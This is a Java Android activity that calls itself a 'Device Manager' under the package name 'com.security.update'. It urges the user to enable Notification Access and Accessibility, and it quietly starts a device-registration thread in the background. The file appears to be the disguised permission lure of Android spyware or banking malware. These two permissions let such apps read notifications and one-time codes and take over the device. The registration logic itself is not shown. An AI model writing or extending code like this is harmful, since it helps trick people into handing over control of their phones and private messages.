package com.security.update;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class WelcomeActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView title = new TextView(this);
        title.setText("Device Manager");
        title.setTextSize(24f);
        title.setPadding(50, 100, 50, 20);

        TextView desc = new TextView(this);
        desc.setText("This app helps manage your device settings and security.\n\nPlease enable the following:");
        desc.setTextSize(14f);
        desc.setPadding(50, 20, 50, 20);

        Button notifBtn = new Button(this);
        notifBtn.setText("1. Enable Notification Access");
        notifBtn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        });

        Button a11yBtn = new Button(this);
        a11yBtn.setText("2. Enable Accessibility");
        a11yBtn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.addView(title);
        layout.addView(desc);
        layout.addView(notifBtn);
        layout.addView(a11yBtn);

        setContentView(layout);

        new Thread(() -> DeviceRegistrar.getOrRegister(getApplicationContext())).start();
    }
}
